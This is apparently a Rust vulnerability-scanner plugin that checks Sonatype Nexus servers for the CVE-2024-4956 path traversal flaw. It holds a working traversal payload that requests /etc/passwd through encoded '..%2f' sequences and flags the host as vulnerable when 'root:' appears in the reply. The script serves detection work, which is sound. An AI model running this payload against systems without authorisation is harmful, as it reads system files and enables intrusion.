/* http-vuln-cve2024-4956-4 - Sonatype Nexus path traversal probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if !valid(ctx) {
        return 1;
    }
    let resp = match http_request(ctx, "GET", "/repository/..%2f..%2f..%2f..%2fetc%2fpasswd", None, "", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => {
            set_out(ctx, "http-vuln-cve2024-4956-4: no HTTP response");
            return 0;
        }
    };
    let code = http_status(&resp);
    if contains_ci(&resp, "root:") {
        set_out(ctx, &format!("VULNERABLE: /repository/..%2f..%2f..%2f..%2fetc%2fpasswd [{}] (CVE-2024-4956)", code));
    } else {
        set_out(ctx, &format!("not vulnerable: CVE-2024-4956 (/repository/..%2f..%2f..%2f..%2fetc%2fpasswd [{}])", code));
    }
    0
}
